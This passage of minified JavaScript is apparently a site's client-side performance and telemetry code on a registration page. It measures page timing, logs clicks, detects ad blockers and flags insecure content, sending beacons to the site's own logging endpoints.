                            h && k && h > c ? (f("csm.jumpStart.mtsDiff", h - c || 0), a("csm-rld-mts-gt")) : h && k ? a("csm-rld-mts-leq") : k ? h || a("csm-rld-mts-no-new") : a("csm-rld-mts-no-old")
                        }
                        g &&
                            g.timing && g.timing.navigationStart ? b.timing.transitionStart = g.timing.navigationStart : delete b.timing.transitionStart
                    }

                    function v() {
                        try {
                            a.P.register("AMZNPerformance", function() {
                                return b
                            })
                        } catch (c) {}
                    }

                    function r() {
                        if (!b) return "";
                        ue_mbl.cnt = null;
                        var c = b.timing,
                            d = b.transition,
                            d = ["mts", l(c.transitionStart), "mps", l(c.processStart), "mtt", d.type, "mtst", d.subType, "mtlt", d.launchType];
                        x && a.ue && a.ue.tag && (c.fr_ovr && a.ue.tag("fr_ovr"), c.fcp_ovr && a.ue.tag("fcp_ovr"), d.push("fr_ovr", l(c.fr_ovr), "fcp_ovr", l(c.fcp_ovr)));
                        for (var c = "", e = 0; e < d.length; e += 2) {
                            var f = d[e],
                                g = d[e + 1];
                            "undefined" !== typeof g && (c += "&" + f + "=" + g)
                        }
                        return c
                    }

                    function l(a) {
                        if ("undefined" !== typeof a && "undefined" !== typeof m) return a - m
                    }

                    function y(a, d) {
                        b && (m = d, b.timing.transitionStart = a, b.transition.type = "view-transition", b.transition.subType = "ajax-transition", b.transition.launchType = "normal", ue_mbl.cnt = r)
                    }
                    var e = f.ue || {},
                        m = f.ue_t0,
                        q = "csm-last-mts",
                        p = 1 === f.ue_sswmts,
                        x = 1 === f.ue_ovrssc,
                        n, g = a.performance,
                        b;
                    if (a.P && a.P.when && a.P.register) return 1 === a.ue_fnt &&
                        (m = a.aPageStart || f.ue_t0), a.P.when("CSMPlugin").execute(function(a) {
                            a.buildAMZNPerformance && a.buildAMZNPerformance({
                                successCallback: s,
                                failCallback: w
                            })
                        }), {
                            cnt: r,
                            ajax: y
                        }
                }, "mobile-timing")(ue_csm, ue_csm.window);

                (function(d) {
                    d._uess = function() {
                        var a = "";
                        screen && screen.width && screen.height && (a += "&sw=" + screen.width + "&sh=" + screen.height);
                        var b = function(a) {
                                var b = document.documentElement["client" + a];
                                return "CSS1Compat" === document.compatMode && b || document.body["client" + a] || b
                            },
                            c = b("Width"),
                            b = b("Height");
                        c && b && (a += "&vw=" + c + "&vh=" + b);
                        return a
                    }
                })(ue_csm);

                (function(a) {
                    var b = document.ue_backdetect;
                    b && b.ue_back && a.ue && (a.ue.bfini = b.ue_back.value);
                    a.uet && a.uet("be");
                    a.onLdEnd && (window.addEventListener ? window.addEventListener("load", a.onLdEnd, !1) : window.attachEvent && window.attachEvent("onload", a.onLdEnd));
                    a.ueh && a.ueh(0, window, "load", a.onLd, 1);
                    a.ue && a.ue.tag && (a.ue_furl ? (b = a.ue_furl.replace(/\./g, "-"), a.ue.tag(b)) : a.ue.tag("nofls"))
                })(ue_csm);

                (function(g, h) {
                    function d(a, d) {
                        var b = {};
                        if (!e || !f) try {
                            var c = h.sessionStorage;
                            c ? a && ("undefined" !== typeof d ? c.setItem(a, d) : b.val = c.getItem(a)) : f = 1
                        } catch (g) {
                            e = 1
                        }
                        e && (b.e = 1);
                        return b
                    }
                    var b = g.ue || {},
                        a = "",
                        f, e, c, a = d("csmtid");
                    f ? a = "NA" : a.e ? a = "ET" : (a = a.val, a || (a = b.oid || "NI", d("csmtid", a)), c = d(b.oid), c.e || (c.val = c.val || 0, d(b.oid, c.val + 1)), b.ssw = d);
                    b.tabid = a
                })(ue_csm, ue_csm.window);

                ue_csm.ue.exec(function(e, f) {
                    var a = e.ue || {},
                        b = a._wlo,
                        d;
                    if (a.ssw) {
                        d = a.ssw("CSM_previousURL").val;
                        var c = f.location,
                            b = b ? b : c && c.href ? c.href.split("#")[0] : void 0;
                        c = (b || "") === a.ssw("CSM_previousURL").val;
                        !c && b && a.ssw("CSM_previousURL", b);
                        d = c ? "reload" : d ? "intrapage-transition" : "first-view"
                    } else d = "unknown";
                    a._nt = d
                }, "NavTypeModule")(ue_csm, window);
                ue_csm.ue.exec(function(c, a) {
                    function g(a) {
                        a.run(function(e) {
                            d.tag("csm-feature-" + a.name + ":" + e);
                            d.isl && c.uex("at")
                        })
                    }
                    if (a.addEventListener)
                        for (var d = c.ue || {}, f = [{
                                name: "touch-enabled",
                                run: function(b) {
                                    var e = function() {
                                            a.removeEventListener("touchstart", c, !0);
                                            a.removeEventListener("mousemove", d, !0)
                                        },
                                        c = function() {
                                            b("true");
                                            e()
                                        },
                                        d = function() {
                                            b("false");
                                            e()
                                        };
                                    a.addEventListener("touchstart", c, !0);
                                    a.addEventListener("mousemove", d, !0)
                                }
                            }], b = 0; b < f.length; b++) g(f[b])
                }, "csm-features")(ue_csm, window);


                (function(b, c) {
                    var a = c.images;
                    a && a.length && b.ue.count("totalImages", a.length)
                })(ue_csm, document);
                (function(b) {
                    function c() {
                        var d = [];
                        a.log && a.log.isStub && a.log.replay(function(a) {
                            e(d, a)
                        });
                        a.clog && a.clog.isStub && a.clog.replay(function(a) {
                            e(d, a)
                        });
                        d.length && (a._flhs += 1, n(d), p(d))
                    }

                    function g() {
                        a.log && a.log.isStub && (a.onflush && a.onflush.replay && a.onflush.replay(function(a) {
                            a[0]()
                        }), a.onunload && a.onunload.replay && a.onunload.replay(function(a) {
                            a[0]()
                        }), c())
                    }

                    function e(d, b) {
                        var c = b[1],
                            f = b[0],
                            e = {};
                        a._lpn[c] = (a._lpn[c] || 0) + 1;
                        e[c] = f;
                        d.push(e)
                    }

                    function n(b) {
                        q && (a._lpn.csm = (a._lpn.csm || 0) + 1, b.push({
                            csm: {
                                k: "chk",
                                f: a._flhs,
                                l: a._lpn,
                                s: "inln"
                            }
                        }))
                    }

                    function p(a) {
                        if (h) a = k(a), b.navigator.sendBeacon(l, a);
                        else {
                            a = k(a);
                            var c = new b[f];
                            c.open("POST", l, !0);
                            c.setRequestHeader && c.setRequestHeader("Content-type", "text/plain");
                            c.send(a)
                        }
                    }

                    function k(a) {
                        return JSON.stringify({
                            rid: b.ue_id,
                            sid: b.ue_sid,
                            mid: b.ue_mid,
                            mkt: b.ue_mkt,
                            sn: b.ue_sn,
                            reqs: a
                        })
                    }
                    var f = "XMLHttpRequest",
                        q = 1 === b.ue_ddq,
                        a = b.ue,
                        r = b[f] && "withCredentials" in new b[f],
                        h = b.navigator && b.navigator.sendBeacon,
                        l = "//" + b.ue_furl + "/1/batch/1/OE/",
                        m = b.ue_fci_ft || 5E3;
                    a && (r || h) &&
                        (a._flhs = a._flhs || 0, a._lpn = a._lpn || {}, a.attach && (a.attach("beforeunload", a.exec(g, "fcli-bfu")), a.attach("pagehide", a.exec(g, "fcli-ph"))), m && b.setTimeout(a.exec(c, "fcli-t"), m), a._ffci = a.exec(c))
                })(window);


                (function(k, c) {
                    function l(a, b) {
                        return a.filter(function(a) {
                            return a.initiatorType == b
                        })
                    }

                    function f(a, c) {
                        if (b.t[a]) {
                            var g = b.t[a] - b._t0,
                                e = c.filter(function(a) {
                                    return 0 !== a.responseEnd && m(a) < g
                                }),
                                f = l(e, "script"),
                                h = l(e, "link"),
                                k = l(e, "img"),
                                n = e.map(function(a) {
                                    return a.name.split("/")[2]
                                }).filter(function(a, b, c) {
                                    return a && c.lastIndexOf(a) == b
                                }),
                                q = e.filter(function(a) {
                                    return a.duration < p
                                }),
                                s = g - Math.max.apply(null, e.map(m)) < r | 0;
                            "af" == a && (b._afjs = f.length);
                            return a + ":" + [e[d], f[d], h[d], k[d], n[d], q[d], s].join("-")
                        }
                    }

                    function m(a) {
                        return a.responseEnd - (b._t0 - c.timing.navigationStart)
                    }

                    function n() {
                        var a = c[h]("resource"),
                            d = f("cf", a),
                            g = f("af", a),
                            a = f("ld", a);
                        delete b._rt;
                        b._ld = b.t.ld - b._t0;
                        b._art && b._art();
                        return [d, g, a].join("_")
                    }
                    var p = 20,
                        r = 50,
                        d = "length",
                        b = k.ue,
                        h = "getEntriesByType";
                    b._rre = m;
                    b._rt = c && c.timing && c[h] && n
                })(ue_csm, window.performance);


                (function(c, d) {
                    var b = c.ue,
                        a = d.navigator;
                    b && b.tag && a && (a = a.connection || a.mozConnection || a.webkitConnection) && a.type && b.tag("netInfo:" + a.type)
                })(ue_csm, window);


                (function(c, d) {
                    function h(a, b) {
                        for (var c = [], d = 0; d < a.length; d++) {
                            var e = a[d],
                                f = b.encode(e);
                            if (e[k]) {
                                var g = b.metaSep,
                                    e = e[k],
                                    l = b.metaPairSep,
                                    h = [],
                                    m = void 0;
                                for (m in e) e.hasOwnProperty(m) && h.push(m + "=" + e[m]);
                                e = h.join(l);
                                f += g + e
                            }
                            c.push(f)
                        }
                        return c.join(b.resourceSep)
                    }

                    function s(a) {
                        var b = a[k] = a[k] || {};
                        b[t] || (b[t] = c.ue_mid);
                        b[u] || (b[u] = c.ue_sid);
                        b[f] || (b[f] = c.ue_id);
                        b.csm = 1;
                        a = "//" + c.ue_furl + "/1/" + a[v] + "/1/OP/" + a[w] + "/" + a[x] + "/" + h([a], y);
                        if (n) try {
                            n.call(d[p], a)
                        } catch (g) {
                            c.ue.sbf = 1, (new Image).src = a
                        } else(new Image).src =
                            a
                    }

                    function q() {
                        g && g.isStub && g.replay(function(a, b, c) {
                            a = a[0];
                            b = a[k] = a[k] || {};
                            b[f] = b[f] || c;
                            s(a)
                        });
                        l.impression = s;
                        g = null
                    }
                    if (!(1 < c.ueinit)) {
                        var k = "metadata",
                            x = "impressionType",
                            v = "foresterChannel",
                            w = "programGroup",
                            t = "marketplaceId",
                            u = "session",
                            f = "requestId",
                            p = "navigator",
                            l = c.ue || {},
                            n = d[p] && d[p].sendBeacon,
                            r = function(a, b, c, d) {
                                return {
                                    encode: d,
                                    resourceSep: a,
                                    metaSep: b,
                                    metaPairSep: c
                                }
                            },
                            y = r("", "?", "&", function(a) {
                                return h(a.impressionData, z)
                            }),
                            z = r("/", ":", ",", function(a) {
                                return a.featureName + ":" + h(a.resources,
                                    A)
                            }),
                            A = r(",", "@", "|", function(a) {
                                return a.id
                            }),
                            g = l.impression;
                        n ? q() : (l.attach("load", q), l.attach("beforeunload", q));
                        try {
                            d.P && d.P.register && d.P.register("impression-client", function() {})
                        } catch (B) {
                            c.ueLogError(B, {
                                logLevel: "WARN"
                            })
                        }
                    }
                })(ue_csm, window);



                var ue_pty = "AuthenticationPortal";

                var ue_spty = "RegistrationApplication";



                var ue_adb = 4;
                var ue_adb_rtla = 1;
                ue_csm.ue.exec(function(y, a) {
                    function t() {
                        if (d && f) {
                            var a;
                            a: {
                                try {
                                    a = d.getItem(g);
                                    break a
                                } catch (c) {}
                                a = void 0
                            }
                            if (a) return b = a, !0
                        }
                        return !1
                    }

                    function u() {
                        if (a.fetch) fetch(m).then(function(a) {
                            if (!a.ok) throw Error(a.statusText);
                            return a.text ? a.text() : null
                        }).then(function(b) {
                            b ? (-1 < b.indexOf("window.ue_adb_chk = 1") && (a.ue_adb_chk = 1), n()) : h()
                        })["catch"](h);
                        else e.uels(m, {
                            onerror: h,
                            onload: n
                        })
                    }

                    function h() {
                        b = k;
                        l();
                        if (f) try {
                            d.setItem(g, b)
                        } catch (a) {}
                    }

                    function n() {
                        b = 1 === a.ue_adb_chk ? p : k;
                        l();
                        if (f) try {
                            d.setItem(g,
                                b)
                        } catch (c) {}
                    }

                    function q() {
                        a.ue_adb_rtla && c && 0 < c.ec && !1 === r && (c.elh = null, ueLogError({
                            m: "Hit Info",
                            fromOnError: 1
                        }, {
                            logLevel: "INFO",
                            adb: b
                        }), r = !0)
                    }

                    function l() {
                        e.tag(b);
                        e.isl && a.uex && uex("at", b);
                        s && s.updateCsmHit("adb", b);
                        c && 0 < c.ec ? q() : a.ue_adb_rtla && c && (c.elh = q)
                    }

                    function v() {
                        return b
                    }
                    if (a.ue_adb) {
                        a.ue_fadb = a.ue_fadb || 10;
                        var e = a.ue,
                            k = "adblk_yes",
                            p = "adblk_no",
                            m = "https://m.media-amazon.com/images/G/01/csm/showads.v2.js?adtag=csm&adflag=-google-adsense.",
                            b = "adblk_unk",
                            d;
                        a: {
                            try {
                                d = a.localStorage;
                                break a
                            } catch (z) {}
                            d =
                            void 0
                        }
                        var g = "csm:adb",
                            c = a.ue_err,
                            s = e.cookie,
                            f = void 0 !== a.localStorage,
                            w = Math.random() > 1 - 1 / a.ue_fadb,
                            r = !1,
                            x = t();
                        w || !x ? u() : l();
                        a.ue_isAdb = v;
                        a.ue_isAdb.unk = "adblk_unk";
                        a.ue_isAdb.no = p;
                        a.ue_isAdb.yes = k
                    }
                }, "adb")(document, window);




                (function(c, l, m) {
                    function h(a) {
                        if (a) try {
                            if (a.id) return "//*[@id='" + a.id + "']";
                            var b, d = 1,
                                e;
                            for (e = a.previousSibling; e; e = e.previousSibling) e.nodeName === a.nodeName && (d += 1);
                            b = d;
                            var c = a.nodeName;
                            1 !== b && (c += "[" + b + "]");
                            a.parentNode && (c = h(a.parentNode) + "/" + c);
                            return c
                        } catch (f) {
                            return "DETACHED"
                        }
                    }

                    function f(a) {
                        if (a && a.getAttribute) return a.getAttribute(k) ? a.getAttribute(k) : f(a.parentElement)
                    }
                    var k = "data-cel-widget",
                        g = !1,
                        d = [];
                    (c.ue || {}).isBF = function() {
                        try {
                            var a = JSON.parse(localStorage["csm-bf"] || "[]"),
                                b = 0 <= a.indexOf(c.ue_id);
                            a.unshift(c.ue_id);
                            a = a.slice(0, 20);
                            localStorage["csm-bf"] = JSON.stringify(a);
                            return b
                        } catch (d) {
                            return !1
                        }
                    }();
                    c.ue_utils = {
                        getXPath: h,
                        getFirstAscendingWidget: function(a, b) {
                            c.ue_cel && c.ue_fem ? !0 === g ? b(f(a)) : d.push({
                                element: a,
                                callback: b
                            }) : b()
                        },
                        notifyWidgetsLabeled: function() {
                            if (!1 === g) {
                                g = !0;
                                for (var a = f, b = 0; b < d.length; b++)
                                    if (d[b].hasOwnProperty("callback") && d[b].hasOwnProperty("element")) {
                                        var c = d[b].callback,
                                            e = d[b].element;
                                        "function" === typeof c && "function" === typeof a && c(a(e))
                                    } d = null
                            }
                        },
                        extractStringValue: function(a) {
                            if ("string" ===
                                typeof a) return a
                        }
                    }
                })(ue_csm, window, document);





                ue_csm.ue_unrt = 1500;
                (function(d, b, t) {
                    function u(a, g) {
                        var c = a.srcElement || a.target || {},
                            b = {
                                k: v,
                                t: g.t,
                                dt: g.dt,
                                x: a.pageX,
                                y: a.pageY,
                                p: e.getXPath(c),
                                n: c.nodeName
                            };
                        a.button && (b.b = a.button);
                        c.type && (b.ty = c.type);
                        c.href && (b.r = e.extractStringValue(c.href));
                        c.id && (b.i = c.id);
                        c.className && c.className.split && (b.c = c.className.split(/\s+/));
                        h += 1;
                        e.getFirstAscendingWidget(c, function(a) {
                            b.wd = a;
                            d.ue.log(b, r)
                        })
                    }

                    function w(a) {
                        if (!x(a.srcElement || a.target)) {
                            m += 1;
                            n = !0;
                            var g = f = d.ue.d(),
                                c;
                            p && "function" === typeof p.now && a.timeStamp && (c = p.now() -
                                a.timeStamp, c = parseFloat(c.toFixed(2)));
                            s = b.setTimeout(function() {
                                u(a, {
                                    t: g,
                                    dt: c
                                })
                            }, y)
                        }
                    }

                    function z(a) {
                        if (a) {
                            var b = a.filter(A);
                            a.length !== b.length && (q = !0, k = d.ue.d(), n && q && (k && f && d.ue.log({
                                k: B,
                                t: f,
                                m: Math.abs(k - f)
                            }, r), l(), q = !1, k = 0))
                        }
                    }

                    function A(a) {
                        if (!a) return !1;
                        var b = "characterData" === a.type ? a.target.parentElement : a.target;
                        if (!b || !b.hasAttributes || !b.attributes) return !1;
                        var c = {
                                "class": "gw-clock gw-clock-aria s-item-container-height-auto feed-carousel using-mouse kfs-inner-container".split(" "),
                                id: ["dealClock",
                                    "deal_expiry_timer", "timer"
                                ],
                                role: ["timer"]
                            },
                            d = !1;
                        Object.keys(c).forEach(function(a) {
                            var e = b.attributes[a] ? b.attributes[a].value : "";
                            (c[a] || "").forEach(function(a) {
                                -1 !== e.indexOf(a) && (d = !0)
                            })
                        });
                        return d
                    }

                    function x(a) {
                        if (!a) return !1;
                        var b = (e.extractStringValue(a.nodeName) || "").toLowerCase(),
                            c = (e.extractStringValue(a.type) || "").toLowerCase(),
                            d = (e.extractStringValue(a.href) || "").toLowerCase();
                        a = (e.extractStringValue(a.id) || "").toLowerCase();
                        var f = "checkbox color date datetime-local email file month number password radio range reset search tel text time url week".split(" ");
                        if (-1 !== ["select", "textarea", "html"].indexOf(b) || "input" === b && -1 !== f.indexOf(c) || "a" === b && -1 !== d.indexOf("http") || -1 !== ["sitbreaderrightpageturner", "sitbreaderleftpageturner", "sitbreaderpagecontainer"].indexOf(a)) return !0
                    }

                    function l() {
                        n = !1;
                        f = 0;
                        b.clearTimeout(s)
                    }

                    function C() {
                        b.ue.onunload(function() {
                            ue.count("armored-cxguardrails.unresponsive-clicks.violations", h);
                            ue.count("armored-cxguardrails.unresponsive-clicks.violationRate", h / m * 100 || 0)
                        })
                    }
                    if (b.MutationObserver && b.addEventListener && Object.keys &&
                        d && d.ue && d.ue.log && d.ue_unrt && d.ue_utils) {
                        var y = d.ue_unrt,
                            r = "cel",
                            v = "unr_mcm",
                            B = "res_mcm",
                            p = b.performance,
                            e = d.ue_utils,
                            n = !1,
                            f = 0,
                            s = 0,
                            q = !1,
                            k = 0,
                            h = 0,
                            m = 0;
                        b.addEventListener && (b.addEventListener("mousedown", w, !0), b.addEventListener("beforeunload", l, !0), b.addEventListener("visibilitychange", l, !0), b.addEventListener("pagehide", l, !0));
                        b.ue && b.ue.event && b.ue.onSushiUnload && b.ue.onunload && C();
                        (new MutationObserver(z)).observe(t, {
                            childList: !0,
                            attributes: !0,
                            characterData: !0,
                            subtree: !0
                        })
                    }
                })(ue_csm, window, document);


                ue_csm.ue.exec(function(g, e) {
                    if (e.ue_err) {
                        var f = "";
                        e.ue_err.errorHandlers || (e.ue_err.errorHandlers = []);
                        e.ue_err.errorHandlers.push({
                            name: "fctx",
                            handler: function(a) {
                                if (!a.logLevel || "FATAL" === a.logLevel)
                                    if (f = g.getElementsByTagName("html")[0].innerHTML) {
                                        var b = f.indexOf("var ue_t0=ue_t0||+new Date();");
                                        if (-1 !== b) {
                                            var b = f.substr(0, b).split(String.fromCharCode(10)),
                                                d = Math.max(b.length - 10 - 1, 0),
                                                b = b.slice(d, b.length - 1);
                                            a.fcsmln = d + b.length + 1;
                                            a.cinfo = a.cinfo || {};
                                            for (var c = 0; c < b.length; c++) a.cinfo[d + c + 1 + ""] =
                                                b[c]
                                        }
                                        b = f.split(String.fromCharCode(10));
                                        a.cinfo = a.cinfo || {};
                                        if (!(a.f || void 0 === a.l || a.l in a.cinfo))
                                            for (c = +a.l - 1, d = Math.max(c - 5, 0), c = Math.min(c + 5, b.length - 1); d <= c; d++) a.cinfo[d + 1 + ""] = b[d]
                                    }
                            }
                        })
                    }
                }, "fatals-context")(document, window);


                (function(m, a) {
                    function c(k) {
                        function f(b) {
                            b && "string" === typeof b && (b = (b = b.match(/^(?:https?:)?\/\/(.*?)(\/|$)/i)) && 1 < b.length ? b[1] : null, b && b && ("number" === typeof e[b] ? e[b]++ : e[b] = 1))
                        }

                        function d(b) {
                            var e = 10,
                                d = +new Date;
                            b && b.timeRemaining ? e = b.timeRemaining() : b = {
                                timeRemaining: function() {
                                    return Math.max(0, e - (+new Date - d))
                                }
                            };
                            for (var c = a.performance.getEntries(), k = e; g < c.length && k > n;) c[g].name && f(c[g].name), g++, k = b.timeRemaining();
                            g >= c.length ? h(!0) : l()
                        }

                        function h(b) {
                            if (!b) {
                                b = m.scripts;
                                var c;
                                if (b)
                                    for (var d =
                                            0; d < b.length; d++)(c = b[d].getAttribute("src")) && "undefined" !== c && f(c)
                            }
                            0 < Object.keys(e).length && (p && ue_csm.ue && ue_csm.ue.event && ue_csm.ue.event({
                                domains: e,
                                pageType: a.ue_pty || null,
                                subPageType: a.ue_spty || null,
                                pageTypeId: a.ue_pti || null
                            }, "csm", "csm.CrossOriginDomains.2"), a.ue_ext = e)
                        }

                        function l() {
                            !0 === k ? d() : a.requestIdleCallback ? a.requestIdleCallback(d) : a.requestAnimationFrame ? a.requestAnimationFrame(d) : a.setTimeout(d, 100)
                        }

                        function c() {
                            if (a.performance && a.performance.getEntries) {
                                var b = a.performance.getEntries();
                                !b || 0 >= b.length ? h(!1) : l()
                            } else h(!1)
                        }
                        var e = a.ue_ext || {};
                        a.ue_ext || c();
                        return e
                    }

                    function q() {
                        setTimeout(c, r)
                    }
                    var s = a.ue_dserr || !1,
                        p = !0,
                        n = 1,
                        r = 2E3,
                        g = 0;
                    a.ue_err && s && (a.ue_err.errorHandlers || (a.ue_err.errorHandlers = []), a.ue_err.errorHandlers.push({
                        name: "ext",
                        handler: function(a) {
                            if (!a.logLevel || "FATAL" === a.logLevel) {
                                var f = c(!0),
                                    d = [],
                                    h;
                                for (h in f) {
                                    var f = h,
                                        g = f.match(/amazon(\.com?)?\.\w{2,3}$/i);
                                    g && 1 < g.length || -1 !== f.indexOf("amazon-adsystem.com") || -1 !== f.indexOf("amazonpay.com") || -1 !== f.indexOf("cloudfront-labs.amazonaws.com") ||
                                        d.push(h)
                                }
                                a.ext = d
                            }
                        }
                    }));
                    a.ue && a.ue.isl ? c() : a.ue && ue.attach && ue.attach("load", q)
                })(document, window);





                var ue_wtc_c = 3;
                ue_csm.ue.exec(function(b, e) {
                    function l() {
                        for (var a = 0; a < f.length; a++) a: for (var d = s.replace(A, f[a]) + g[f[a]] + t, c = arguments, b = 0; b < c.length; b++) try {
                            c[b].send(d);
                            break a
                        } catch (e) {}
                        g = {};
                        f = [];
                        n = 0;
                        k = p
                    }

                    function u() {
                        B ? l(q) : l(C, q)
                    }

                    function v(a, m, c) {
                        r++;
                        if (r > w) d.count && 1 == r - w && (d.count("WeblabTriggerThresholdReached", 1), b.ue_int && console.error("Number of max call reached. Data will no longer be send"));
                        else {
                            var h = c || {};
                            h && -1 < h.constructor.toString().indexOf(D) && a && -1 < a.constructor.toString().indexOf(x) && m && -1 <
                                m.constructor.toString().indexOf(x) ? (h = b.ue_id, c && c.rid && (h = c.rid), c = h, a = encodeURIComponent(",wl=" + a + "/" + m), 2E3 > a.length + p ? (2E3 < k + a.length && u(), void 0 === g[c] && (g[c] = "", f.push(c)), g[c] += a, k += a.length, n || (n = e.setTimeout(u, E))) : b.ue_int && console.error("Invalid API call. The input provided is over 2000 chars.")) : d.count && (d.count("WeblabTriggerImproperAPICall", 1), b.ue_int && console.error("Invalid API call. The input provided does not match the API protocol i.e ue.trigger(String, String, Object)."))
                        }
                    }

                    function F() {
                        d.trigger &&
                            d.trigger.isStub && d.trigger.replay(function(a) {
                                v.apply(this, a)
                            })
                    }

                    function y() {
                        z || (f.length && l(q), z = !0)
                    }
                    var t = ":1234",
                        s = "//" + b.ue_furl + "/1/remote-weblab-triggers/1/OE/" + b.ue_mid + ":" + b.ue_sid + ":PLCHLDR_RID$s:wl-client-id%3DCSMTriger",
                        A = "PLCHLDR_RID",
                        E = b.wtt || 1E4,
                        p = s.length + t.length,
                        w = b.mwtc || 2E3,
                        G = 1 === e.ue_wtc_c,
                        B = 3 === e.ue_wtc_c,
                        H = e.XMLHttpRequest && "withCredentials" in new e.XMLHttpRequest,
                        x = "String",
                        D = "Object",
                        d = b.ue,
                        g = {},
                        f = [],
                        k = p,
                        n, z = !1,
                        r = 0,
                        C = function() {
                            return {
                                send: function(a) {
                                    if (H) {
                                        var b = new e.XMLHttpRequest;
                                        b.open("GET", a, !0);
                                        G && (b.withCredentials = !0);
                                        b.send()
                                    } else throw "";
                                }
                            }
                        }(),
                        q = function() {
                            return {
                                send: function(a) {
                                    (new Image).src = a
                                }
                            }
                        }();
                    e.encodeURIComponent && (d.attach && (d.attach("beforeunload", y), d.attach("pagehide", y)), F(), d.trigger = v)
                }, "client-wbl-trg")(ue_csm, window);


                (function(k, d, h) {
                    function f(a, c, b) {
                        a && a.indexOf && 0 === a.indexOf("http") && 0 !== a.indexOf("https") && l(s, c, a, b)
                    }

                    function g(a, c, b) {
                        a && a.indexOf && (location.href.split("#")[0] != a && null !== a && "undefined" !== typeof a || l(t, c, a, b))
                    }

                    function l(a, c, b, e) {
                        m[b] || (e = u && e ? n(e) : "N/A", d.ueLogError && d.ueLogError({
                            message: a + c + " : " + b,
                            logLevel: v,
                            stack: "N/A"
                        }, {
                            attribution: e
                        }), m[b] = 1, p++)
                    }

                    function e(a, c) {
                        if (a && c)
                            for (var b = 0; b < a.length; b++) try {
                                c(a[b])
                            } catch (d) {}
                    }

                    function q() {
                        return d.performance && d.performance.getEntriesByType ?
                            d.performance.getEntriesByType("resource") : []
                    }

                    function n(a) {
                        if (a.id) return "//*[@id='" + a.id + "']";
                        var c;
                        c = 1;
                        var b;
                        for (b = a.previousSibling; b; b = b.previousSibling) b.nodeName == a.nodeName && (c += 1);
                        b = a.nodeName;
                        1 != c && (b += "[" + c + "]");
                        a.parentNode && (b = n(a.parentNode) + "/" + b);
                        return b
                    }

                    function w() {
                        var a = h.images;
                        a && a.length && e(a, function(a) {
                            var b = a.getAttribute("src");
                            f(b, "img", a);
                            g(b, "img", a)
                        })
                    }

                    function x() {
                        var a = h.scripts;
                        a && a.length && e(a, function(a) {
                            var b = a.getAttribute("src");
                            f(b, "script", a);
                            g(b, "script", a)
                        })
                    }

                    function y() {
                        var a = h.styleSheets;
                        a && a.length && e(a, function(a) {
                            if (a = a.ownerNode) {
                                var b = a.getAttribute("href");
                                f(b, "style", a);
                                g(b, "style", a)
                            }
                        })
                    }

                    function z() {
                        if (A) {
                            var a = q();
                            e(a, function(a) {
                                f(a.name, a.initiatorType)
                            })
                        }
                    }

                    function B() {
                        e(q(), function(a) {
                            g(a.name, a.initiatorType)
                        })
                    }

                    function r() {
                        var a;
                        a = d.location && d.location.protocol ? d.location.protocol : void 0;
                        "https:" == a && (z(), w(), x(), y(), B(), p < C && setTimeout(r, D))
                    }
                    var s = "[CSM] Insecure content detected ",
                        t = "[CSM] Ajax request to same page detected ",
                        v = "WARN",
                        m = {},
                        p = 0,
                        D = k.ue_nsip || 1E3,
                        C = 5,
                        A = 1 == k.ue_urt,
                        u = !0;
                    ue_csm.ue_disableNonSecure || (d.performance && d.performance.setResourceTimingBufferSize && d.performance.setResourceTimingBufferSize(300), r())
                })(ue_csm, window, document);


                var ue_aa_a = "";
                if (ue.trigger && (ue_aa_a === "C" || ue_aa_a === "T1")) {
                    ue.trigger("UEDATA_AA_SERVERSIDE_ASSIGNMENT_CLIENTSIDE_TRIGGER_190249", ue_aa_a);
                }
                (function(f, b) {
                    function g() {
                        try {
                            b.PerformanceObserver && "function" === typeof b.PerformanceObserver && (a = new b.PerformanceObserver(function(b) {
                                c(b.getEntries())
                            }), a.observe(d))
                        } catch (h) {
                            k()
                        }
                    }

                    function m() {
                        for (var h = d.entryTypes, a = 0; a < h.length; a++) c(b.performance.getEntriesByType(h[a]))
                    }

                    function c(a) {
                        if (a && Array.isArray(a)) {
                            for (var c = 0, e = 0; e < a.length; e++) {
                                var d = l.indexOf(a[e].name);
                                if (-1 !== d) {
                                    var g = Math.round(b.performance.timing.navigationStart + a[e].startTime);
                                    f.uet(n[d], void 0, void 0, g);
                                    c++
                                }
                            }
                            l.length ===
                                c && k()
                        }
                    }

                    function k() {
                        a && a.disconnect && "function" === typeof a.disconnect && a.disconnect()
                    }
                    if ("function" === typeof f.uet && b.performance && "object" === typeof b.performance && b.performance.getEntriesByType && "function" === typeof b.performance.getEntriesByType && b.performance.timing && "object" === typeof b.performance.timing && "number" === typeof b.performance.timing.navigationStart) {
                        var d = {
                                entryTypes: ["paint"]
                            },
                            l = ["first-paint", "first-contentful-paint"],
                            n = ["fp", "fcp"],
                            a;
                        try {
                            m(), g()
                        } catch (p) {
                            f.ueLogError(p, {
                                logLevel: "ERROR",
                                attribution: "performanceMetrics"
                            })
                        }
                    }
                })(ue_csm, window);


                if (window.csa) {
                    csa("Events")("setEntity", {
                        page: {
                            pageType: "AuthenticationPortal",
                            subPageType: "RegistrationApplication",
                            pageTypeId: ""
                        }
                    });
                }
                csa.plugin(function(c) {
                    var m = "transitionStart",
                        n = "pageVisible",
                        e = "PageTiming",
                        t = "visibilitychange",
                        s = "$latency.visible",
                        i = c.global,
                        r = (i.performance || {}).timing,
                        a = ["navigationStart", "unloadEventStart", "unloadEventEnd", "redirectStart", "redirectEnd", "fetchStart", "domainLookupStart", "domainLookupEnd", "connectStart", "connectEnd", "secureConnectionStart", "requestStart", "responseStart", "responseEnd", "domLoading", "domInteractive", "domContentLoadedEventStart", "domContentLoadedEventEnd", "domComplete", "loadEventStart", "loadEventEnd"],
                        o = i.Math,
                        u = o.max,
                        l = o.floor,
                        d = i.document || {},
                        g = (r || {}).navigationStart,
                        f = g,
                        v = 0,
                        p = null;
                    if (i.Object.keys && [].forEach && !c.config["KillSwitch." + e]) {
                        if (!r || null === g || g <= 0 || void 0 === g) return c.error("Invalid navigation timing data: " + g);
                        p = new S({
                            schemaId: "<ns>.PageLatency.5",
                            producerId: "csa"
                        }), "boolean" != typeof d.hidden && "string" != typeof d.visibilityState || !d.removeEventListener ? c.emit(s) : h() ? (c.emit(s), E(n, g)) : c.on(d, t, function e() {
                            h() && (f = c.time(), d.removeEventListener(t, e), E(m, f), E(n, f), c.emit(s))
                        }), c.once("$unload", I), c.once("$load", I), c.on("$pageTransition", function() {
                            f = c.time()
                        }), c.register(e, {
                            mark: E,
                            instance: function(e) {
                                return new S(e)
                            }
                        })
                    }

                    function S(e) {
                        var i, r = null,
                            a = e.ent || {
                                page: ["pageType", "subPageType", "requestId"]
                            },
                            o = e.logger || c("Events", {
                                producerId: e.producerId
                            });
